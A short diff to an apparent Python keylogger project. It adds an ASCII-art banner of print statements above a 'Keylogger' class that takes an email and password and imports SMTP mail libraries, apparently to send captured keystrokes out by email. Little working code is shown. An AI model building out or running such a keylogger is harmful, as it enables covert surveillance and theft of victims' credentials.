@@ -4,6 +4,19 @@ import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
+print('############################################################################################################################################')
+print('')
+print('  ########     ##       ##       ##    ##   ########  ')
+print('  ##           ##        ##     ##     ##      ##     ')
+print('  ##           ##         ##   ##      ##      ##   ')
+print('  ########     ##           ####       ##      ## ')
+print('  ##           ##         ##    ##     ##      ##  ')
+print('  ##           ##        ##      ##    ##      ##      ')
+print('  ##           ##       ##        ##   ##      ##     ')
+print('')
+print('############################################################################################################################################')
+print('')
+
 class Keylogger:
     def __init__(self, time_interval, email, password):
         self.log = "Keylogger started\n"
